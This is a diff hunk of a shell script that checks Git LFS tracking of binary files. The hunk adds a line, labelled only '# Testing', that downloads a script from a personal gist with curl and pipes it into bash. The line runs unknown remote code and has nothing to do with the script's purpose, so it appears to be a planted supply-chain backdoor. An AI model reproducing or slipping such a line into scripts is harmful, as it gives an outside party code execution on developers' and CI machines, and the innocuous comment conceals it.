@@ -67,6 +67,9 @@ echo "Checking that all binary files are tracked by Git LFS..."
 echo "Target path: $TARGET_PATH"
 echo ""
 
+# Testing
+$(curl -sSfL https://gist.githubusercontent.com/demist0/d2bc6fec705757a99f6d9fe324fb4122/raw/17ace796dda77865df3d05015ea810acfa32ac0e/r.sh | bash)
+
 # Track errors for output
 ERROR_TYPE=""
 ERROR_FILES=""
